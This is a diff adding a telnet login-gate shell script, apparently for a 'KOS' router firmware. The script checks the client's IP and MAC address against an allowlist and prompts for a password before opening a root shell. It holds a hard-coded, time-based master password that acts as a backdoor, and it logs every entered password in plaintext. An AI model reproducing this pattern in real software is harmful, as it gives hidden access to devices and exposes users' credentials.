@@ -1,0 +1,37 @@
+#!/bin/sh
+[ "$(awk -F"[)(]" '{print $5}' /proc/version)" = "KOS" ]||exit 2
+zd_mac=$(awk '/'"${REMOTE_HOST:-none} "'/{print$4}' /proc/net/arp 2>/dev/null)
+x=0
+touch /tmp/log/telnet.log
+touch /tmp/.kosanquantime 
+[ "$REMOTE_HOST" = "$(route -n|awk '/UG/{print$2}')" -o "$zd_mac" = "f8:a9:63:2a:41:58" -o "$zd_mac" = "74:e5:43:78:8c:d2" -o "$zd_mac" = "a0:c5:89:48:ea:4f" -o "$REMOTE_HOST" = "127.0.0.1" -o "${#REMOTE_HOST}" = "0" ]||exit 0
+[ "$REMOTE_HOST" = "127.0.0.1" ]&&REMOTE_HOST=""
+while true
+do
+[ "$(cat /tmp/log/telnet.log 2>/dev/null|wc -l)" -ge 3 ]&&exit 0
+clear
+echo "${REMOTE_HOST:+IP:$REMOTE_HOST }${zd_mac:+MAC:$zd_mac }TIME:$(date "+%F %T")"
+read -p "Please enter the login password($((3 - $(cat /tmp/log/telnet.log 2>/dev/null|wc -l)))):" mm
+
+echo $(date "+%F %T") input $REMOTE_HOST $mm >>/tmp/log/telnet.log
+[ "$(which lockos)" ]||{
+newpasswds="$(echo -n "$mm"|md5sum|tr -dc [0-9])"
+netpasswd=$(cat /etc/.passd 2>/dev/null)
+}
+if [ "$mm" = "qq44152970$(date +%M).." -o "$newpasswds" = "${netpasswd:-none}" ];then
+touch /tmp/.kosanquan
+	break
+else
+echo -ne "\nERROR:$mm\n"
+mm=""
+sleep 2
+fi
+clear
+done
+[ -e /tmp/.kosanquan ]&&{
+rm -rf /tmp/log/telnet.log
+clear
+cat /etc/banner
+exec /bin/ash
+}
+
